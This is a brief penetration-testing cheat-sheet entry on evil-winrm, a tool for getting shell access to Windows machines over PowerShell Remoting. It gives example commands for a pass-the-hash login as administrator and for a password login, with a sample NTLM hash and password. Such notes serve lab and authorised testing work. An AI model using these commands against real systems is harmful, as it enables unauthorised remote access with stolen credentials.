# evil-winrm

* `evil-winrm` is used to take advantage of machines with port 5985 or 5986 open which is Powershell Remoting.
* This will provide shell level access to the machine with the user account that you have compromised. &#x20;
* You can auth either with a hash or password
* Supports SSL

### Usage

* Connect with pass the hash attack

```
evil-winrm -i 10.10.100.15 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"
```

* Password Authentication:

```
evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
```
